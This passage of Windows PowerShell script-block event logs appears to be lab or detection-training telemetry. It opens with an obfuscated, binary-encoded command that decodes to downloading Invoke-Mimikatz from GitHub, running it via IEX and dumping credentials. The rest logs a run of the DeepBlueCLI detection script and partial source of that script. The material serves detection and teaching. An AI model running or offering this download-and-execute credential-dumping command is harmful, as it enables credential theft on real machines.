-join('1001001n1000101-1011000g100000<101000e1001110F1100101-1110111@101101<1001111i1100010i1101010n1100101n1100011e1110100@100000-1001110n1100101n1110100n101110e1010111n1100101;1100010<1000011F1101100{1101001-1100101-1101110-1110100i101001<101110-1000100-1101111<1110111F1101110;1101100n1101111i1100001e1100100{1010011;1110100<1110010@1101001i1101110i1100111{101000e100111e1101000@1110100e1110100g1110000g1110011-111010-101111;101111;1110010@1100001@1110111-101110;1100111{1101001F1110100-1101000@1110101{1100010e1110101n1110011@1100101i1110010-1100011i1101111n1101110e1110100i1100101;1101110@1110100n101110i1100011<1101111n1101101-101111n1101101@1100001<1110100i1110100-1101001{1100110;1100101i1110011-1110100F1100001n1110100{1101001@1101111F1101110e101111-1010000<1101111e1110111{1100101e1110010;1010011i1110000n1101100@1101111F1101001e1110100i101111n1101101-1100001;1110011<1110100i1100101<1110010i101111<1000101;1111000;1100110-1101001-1101100<1110100;1110010F1100001<1110100{1101001@1101111n1101110i101111g1001001e1101110<1110110{1101111F1101011n1100101{101101@1001101-1101001{1101101i1101001n1101011n1100001-1110100;1111010<101110-1110000e1110011g110001e100111-101001;111011F100000@1001001{1101110g1110110{1101111i1101011F1100101-101101n1001101g1101001e1101101@1101001-1101011{1100001-1110100{1111010@100000g101101;1000100-1110101g1101101g1110000F1000011g1110010n1100101;1100100<1110011'.splIT( '<{genF-i;@' )| FOreAcH { ([coNvErt]::toInT16(([StriNG]$_) ,2 ) -AS [CHAR]) })| &( ([STRinG]$VerBosEPREfereNce)[1,3]+'x'-jOiN'')","ScriptBlockId":"3c37fa8c-ffe7-42e4-a0c0-9b5367d56742","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:56:09.116415Z"},"EventRecordID":622104,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-E643-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{ ([coNvErt]::toInT16(([StriNG]$_) ,2 ) -AS [CHAR]) }","ScriptBlockId":"a91837b7-db4f-4fd9-a5be-b43bc0ff2c58","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:56:33.244072Z"},"EventRecordID":625952,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-1363-72CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"prompt","ScriptBlockId":"34458031-c492-49ab-ab37-5a91233e7f61","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:56:34.464434Z"},"EventRecordID":625955,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-1B63-72CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":".\\DeepBlue-0.3.ps1 \"\" powershell","ScriptBlockId":"488652dc-acac-4ecc-8814-e791235b1ac5","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":3,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:56:34.470757Z"},"EventRecordID":625956,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-EC56-72CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":2,"ScriptBlockText":"<#\r\n.SYNOPSIS\r\n\r\nA PowerShell module for hunt teaming via Windows event logs\r\n.DESCRIPTION\r\n\r\nDeepBlueCLI can automatically determine events that are typically triggered during a majority of successful breaches, including use of malicious command lines including PowerShell. \r\n.Example\r\n\r\nProcess local Windows security event log:\r\n.\\DeepBlue.ps1\r\n.\\DeepBlue.ps1 -log security\r\n.Example\r\nProcess local Windows system event log:\r\n\r\n.\\DeepBlue.ps1 -log system\r\n.\\DeepBlue.ps1 \"\" system\r\n.Example\r\nProcess evtx file:\r\n\r\n.\\DeepBlue.ps1 .\\evtx\\new-user-security.evtx\r\n.\\DeepBlue.ps1 -file .\\evtx\\new-user-security.evtx\r\n.LINK\r\nhttps://github.com/sans-blue-team/DeepBlueCLI\r\n\r\n#>\r\n\r\n# DeepBlueCLI 0.2 Beta\r\n# Eric Conrad, Backshore Communications, LLC\r\n# deepblue <at> backshore <dot> net\r\n# Twitter: @eric_conrad\r\n# http://ericconrad.com\r\n#\r\n\r\nparam ([string]$file=$env:file,[string]$log=$env:log)           \r\n\r\nfunction Main {\r\n    $text=\"\" # Temporary scratch pad variable to hold output text\r\n    $minlength=1000 # Minimum length of command line to alert\r\n    # Load cmd match regexes from csv file, ignore comments\r\n    $regexes = Get-Content \".\\regexes.txt\" | Select-String '^[^#]' | ConvertFrom-Csv\r\n    # Load cmd whitelist regexes from csv file, ignore comments\r\n    $whitelist = Get-Content \".\\whitelist.txt\" | Select-String '^[^#]' | ConvertFrom-Csv \r\n    $logname=Check-Options $file $log\r\n    \"Processing the \" + $logname + \" log...\"\r\n    $filter=Create-Filter $file $logname\r\n    $failedlogons=0 # Count of failed logons (Security event 4625)\r\n    $maxfailedlogons=100 # Alert after this many failed logons\r\n    # Get the events:\r\n    try{\r\n        $events = iex \"Get-WinEvent $filter -ErrorAction Stop\"\r\n    }\r\n    catch {\r\n        Write-Host \"Get-WinEvent $filter -ErrorAction Stop\"\r\n    \tWrite-Host \"Get-WinEvent error: \" $_.Exception.Message \"`n\"\r\n        Write-Host \"Exiting...`n\"\r\n        exit\r\n    }\r\n    ForEach ($event in $events) {\r\n        $output=\"\" # Final output text string\r\n        $eventXML = [xml]$event.ToXml()\r\n        if ($logname -eq \"Security\"){\r\n            if ($event.id -eq 4688){\r\n                # A new process has been created. (Command Line Logging)\r\n                $commandline=$eventXML.Event.EventData.Data[8].\"#text\"\r\n                $output += (Check-Command $commandline $minlength $regexes $whitelist 0)\r\n            }\r\n            ElseIf ($event.id -eq 4720){ \r\n                # A user account was created.\r\n                $username=$eventXML.Event.EventData.Data[0].\"#text\"\r\n                $securityid=$eventXML.Event.EventData.Data[2].\"#text\"\r\n                $output += \"  New user created: $username`n\"\r\n                $output += \"    - User SID: $securityid`n\"\r\n            }\r\n            ElseIf(($event.id -eq 4728) -or ($event.id -eq 4732)){\r\n                # A member was added to a security-enabled (global|local) group.\r\n                $groupname=$eventXML.Event.EventData.Data[2].\"#text\"\r\n                # Check if group is Administrators, may later expand to all groups\r\n                if ($groupname -eq \"Administrators\"){    \r\n                    $username=$eventXML.Event.EventData.Data[0].\"#text\"\r\n                    $securityid=$eventXML.Event.EventData.Data[1].\"#text\"\r\n                    switch ($event.id){\r\n                        4728 {$output += \"  User added to global $groupname group`n\"}\r\n                        4732 {$output += \"  User added to local $groupname group`n\"}\r\n                    }\r\n                    $output += \"    - Username: $username`n\"\r\n                    $output += \"    - User SID: $securityid`n\"\r\n                }\r\n            }\r\n            ElseIf($event.id -eq 4625){\r\n                # An account failed to log on.\r\n                # Requires auditing logon failures\r\n                # https://technet.microsoft.com/en-us/library/cc976395.aspx\r\n                $username=$eventXML.Event.EventData.Data[5].\"#text\"\r\n                $failedlogons += 1\r\n            }\r\n        }\r\n        ElseIf ($logname -eq \"System\"){\r\n            if ($event.id -eq 7045){\r\n                # A service was installed in the system.\r\n                $servicename=$eventXML.Event.EventData.Data[0].\"#text\"\r\n                # Check for suspicious service name\r\n                $text = (Check-Regex $servicename $regexes 1)\r\n                if ($text){\r\n                    $output += \"  Service created, service name: $servicename`n\"\r\n                    $output += $text\r\n                }\r\n                # Check for suspicious cmd\r\n                $commandline=$eventXML.Event.EventData.Data[1].\"#text\"\r\n                $output += (Check-Command $commandline $minlength $regexes $whitelist 1)\r\n            }\r\n            ElseIf ($event.id -eq 7030){\r\n                # The ... service is marked as an interactive service.  However, the system is configured \r\n                # to not allow interactive services.  This service may not function properly.\r\n                $servicename=$eventXML.Event.EventData.Data.\"#text\"\r\n                $output += \"  Interactive service warning, service name: $servicename`n\"\r\n                # Check for suspicious service name\r\n                $output += (Check-Regex $servicename $regexes 1)\r\n            }\r\n            ElseIf ($event.id -eq 7036){\r\n                # The ... service entered the stopped|running state.\r\n                $servicename=$eventXML.Event.EventData.Data[0].\"#text\"\r\n                $text = (Check-Regex $servicename $regexes 1)\r\n                if ($text){\r\n                    $output += \"  \" + $event.Message + \"`n\"\r\n                    $output += $text\r\n                }\r\n            }\r\n        } \r\n        ElseIf ($logname -eq \"Application\"){\r\n            if (($event.id -eq 2) -and ($event.Providername -eq \"EMET\")){\r\n                # EMET Block\r\n                $output += \"  EMET Block`n\"\r\n                if ($event.Message){ \r\n                    # EMET Message is a blob of text that looks like this:\r\n                    #########################################################\r\n                    # EMET detected HeapSpray mitigation and will close the application: iexplore.exe\r\n                    #\r\n                    # HeapSpray check failed:\r\n                    #   Application   : C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\r\n                    #   User Name     : WIN-CV6AHH1BNU9\\Instructor\r\n                    #   Session ID    : 1\r\n                    #   PID           : 0xBA8 (2984)\r\n                    #   TID           : 0x9E8 (2536)\r\n                    #   Module        : mshtml.dll\r\n                    #  Address       : 0x6FBA7512, pull out relevant parts\r\n                    $array = $event.message -split '\\n' # Split each line of the message into an array\r\n                    $message = $array[0]\r\n                    $application = Remove-Spaces($array[3])\r\n                    $username = Remove-Spaces($array[4])\r\n                    $output += \"  - Message: $message`n\"\r\n                    $output += \"  - $application`n\"\r\n                    $output += \"  - $username`n\" \r\n                }\r\n                Else{\r\n                    # If the message is blank: EMET is not installed locally.\r\n                    # This occurs when parsing remote event logs sent from systems with EMET installed\r\n                    $output += \"  Warning: EMET Message field is blank. Install EMET locally to see full details of this alert\"\r\n                }\r\n            }\r\n        }  \r\n        ElseIf ($logname -eq \"Applocker\"){\r\n            if ($event.id -eq 8004){ \r\n                # ...was prevented from running.\r\n                $output += \"  Applocker block: \" + $event.message\r\n            }\r\n        } \r\n        ElseIf ($logname -eq \"PowerShell\"){\r\n            #$event.pd\r\n            if ($event.id -eq 4103){\r\n                $pscommand= $eventXML.Event.EventData.Data[2].\"#text\"\r\n                if ($pscommand -Match \"Host Application\"){ \r\n                    # Multiline replace, remove everything before \"Host Application = \"\r\n                    $pscommand = $pscommand -Replace \"(?ms)^.*Host.Application = \",\"\"\r\n                    # Remove every line after the \"Host Application = \" line.\r\n                    $pscommand = $pscommand -Replace \"(?ms)`n.*$\",\"\"\r\n                    $output += (Check-Command $pscommand $minlength $regexes $whitelist 0)\r\n                }\r\n            }\r\n            ElseIf ($event.id -eq 4104){\r\n                # This section requires PowerShell command logging, which is not the default with \r\n                # event 4104 (logs the script block but not the command that launched it).\r\n                # \r\n                # Add the following to \\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1\r\n                # $LogCommandHealthEvent = $true\r\n                # $LogCommandLifecycleEvent = $true\r\n                #\r\n                # See the following for more information:\r\n                #\r\n                # https://logrhythm.com/blog/powershell-command-line-logging/\r\n                # http://hackerhurricane.blogspot.com/2014/11/i-powershell-logging-what-everyone.html\r\n                #\r\n                # Thank you: @heinzarelli and @HackerHurricane\r\n                # \r\n                # The command's path is $eventxml.Event.EventData.Data[4]\r\n                # Blank path means it was run as a commandline. CLI parsing is *much* simpler than\r\n                # script parsing.\r\n                # This ignores scripts and grabs PowerShell CLIs\r\n                if (-not ($eventxml.Event.EventData.Data[4].\"#text\")){\r\n                      $pscommand=$eventXML.Event.EventData.Data[2].\"#text\"\r\n                      $output += (Check-Command $pscommand 500 $regexes $whitelist 0)\r\n                }\r\n            }\r\n        }\r\n        ElseIf ($logname -eq \"Sysmon\"){\r\n        #@{logname=\"Microsoft-Windows-Sysmon/Operational\";id=1} | %{$_.Properties[11].Value}| sort -Unique\r\n        #get-winevent @{logname=\"Microsoft-Windows-Sysmon/Operational\";id=1} | % {$_.Properties[11].Value}| Sort-Object -unique\r\n        #Get-WinEvent @{logname=\"Microsoft-Windows-Sysmon/Operational\";id=7}|fl\r\n            # Check command lines\r\n            if ($event.id -eq 1){\r\n                #get-winevent @{logname=\"Microsoft-Windows-Sysmon/Operational\";id=1} | % {$_.Properties[4].Value}\r\n                $commandline=$eventXML.Event.EventData.Data[4].\"#text\"\r\n                # Remove \"Command Line: \" from the $commandline\r\n                #$commandline= $commandline -Replace \"^Command Line:\",\"\"\r\n                #$commandline\r\n                $output += (Check-Command $commandline $minlength $regexes $whitelist 0)\r\n            }\r\n            # Check for unsigned EXEs/DLLs:\r\n            ElseIf ($event.id -eq 7){\r\n                if ($eventXML.Event.EventData.Data[6].\"#text\" -eq \"false\"){\r\n                    $image=$eventXML.Event.EventData.Data[3].\"#text\"\r\n                    $imageload=$eventXML.Event.EventData.Data[4].\"#text\"\r\n                    $hash=$eventXML.Event.EventData.Data[5].\"#text\"\r\n                    $pscommand=  \"  - Image: \" + $image + \"`r`n\"\r\n                    $pscommand+= \"  - ImageLoaded: \" + $imageload + \"`r`n\"      \r\n                    #$pscommand+= \"  - Hash: \" + $hash + \"`r`n\"\r\n                    # Multiple hashes may be logged, we want SHA1. Remove everything through \"SHA1=\"\r\n                    $sha1= $hash -Replace \"(?ms)^.*SHA1=\",\"\"\r\n                    # Split the string on commas, grab field 0\r\n                    $sha1=$sha1.Split(\",\")[0]\r\n                    $hashfile=\".\\hashes\\$sha1\"\r\n                    if (-not (Test-Path $hashfile)){  \r\n                        # Hash file doesn't exist, create it\r\n                        $csv=$image+\",\"+$imageload\r\n                        $csv | Set-Content $hashfile\r\n                    }\r\n                    #$pscommand+= $eventXML.Event.EventData.Data[6].\"#text\" + \"`r`n\"\r\n                    #$pscommand+= $eventXML.Event.EventData.Data[7].\"#text\" + \"`r`n\"\r\n                    #$pscommand+= $eventXML.Event.EventData.Data[8].\"#text\" + \"`r`n\"\r\n                    $output+= \"  Unsigned image:`r`n\"\r\n                    $output+= $pscommand\r\n                 }\r\n             }\r\n        }\r\n        if ($output){\r\n            $event.TimeCreated \r\n            $output\r\n            \"\"\r\n        }\r\n    }\r\n    if ($failedlogons -gt $maxfailedlogons){\r\n         \"High number of failed logons in the security event log: \" + $failedlogons \r\n    }\r\n} \r\n\r\nfunction Check-Options($file, $log)\r\n{\r\n    $log_error=\"Unknown and/or unsupported log type\"\r\n    $logname=\"\"\r\n    # Checks the command line options, return logname to parse\r\n    if($file -eq \"\"){ # No filename provided, parse local logs\r\n        if(($log -eq \"\") -or ($log -eq \"Security\")){ # Parse the security log if no log was selected\r\n            $logname=\"Security\"\r\n        }\r\n        ElseIf ($log -eq \"System\"){\r\n            $logname=\"System\"\r\n        }\r\n        ElseIf ($log -eq \"Application\"){\r\n            $logname=\"Application\"\r\n        }\r\n        ElseIf ($log -eq \"Sysmon\"){\r\n            $logname=\"Sysmon\"\r\n        }\r\n            ElseIf ($log -eq \"Powershell\"){\r\n            $logname=\"Powershell\"\r\n        }\r\n        Else{\r\n            write-host $log_error\r\n            exit 1\r\n        }    \r\n    }\r\n    else{ # Filename provided, check if it exists:\r\n        if (Test-Path $file){ # File exists. Todo: verify it is an evtx file. \r\n            # Get-WinEvent will generate this error for non-evtx files: \"...file does not appear to be a valid log file. \r\n            # Specify only .evtx, .etl, or .evt filesas values of the Path parameter.\"\r\n            #\r\n            # Check the LogName of the first event\r\n            try{\r\n                $event=Get-WinEvent -path $file -max 1 -ErrorAction Stop\r\n            }\r\n            catch\r\n            {\r\n                Write-Host \"Get-WinEvent error: \" $_.Exception.Message \"`n\"\r\n                Write-Host \"Exiting...`n\"\r\n                exit\r\n            }\r\n            switch ($event.LogName){\r\n                \"Security\"    {$logname=\"Security\"}\r\n                \"System\"      {$logname=\"System\"}\r\n                \"Application\" {$logname=\"Application\"}\r\n                \"Microsoft-Windows-AppLocker*\"   {$logname=\"Applocker\"}\r\n                \"Microsoft-Windows-PowerShell/Operational\"   {$logname=\"Powershell\"}\r\n                \"Microsoft-Windows-Sysmon/Operational\"   {$logname=\"Sysmon\"}\r\n                default       {\"Logic error 3, should not reach here...\";Exit 1}\r\n            }\r\n        }\r\n        else{ # Filename does not exist, exit\r\n            Write-host \"Error: no such file. Exiting...\"\r\n            exit 1\r\n        }\r\n    }\r\n    return $logname\r\n}\r\n\r\nfunction Create-Filter($file, $logname)\r\n{\r\n    # Return the Get-Winevent filter \r\n    #\r\n    $sys_events=\"7030,7036,7045\"\r\n    $sec_events=\"4688,4720,4728,4732,4625\"\r\n    $app_events=\"2\"\r\n    $applocker_events=\"8003,8004,8006,8007\"\r\n    $powershell_events=\"4103,4104\"\r\n    $sysmon_events=\"1,7\"\r\n    if ($file -ne \"\"){\r\n        switch ($logname){\r\n            \"Security\"    {$filter=\"@{path=\"\"$file\"\";ID=$sec_events}\"}\r\n            \"System\"      {$filter=\"@{path=\"\"$file\"\";ID=$sys_events}","ScriptBlockId":"eaed6495-6041-40c1-9608-03e25caf5acd","Path":"C:\\Users\\student\\Desktop\\DeepBlueCLI-master\\DeepBlue-0.3.ps1"}}}
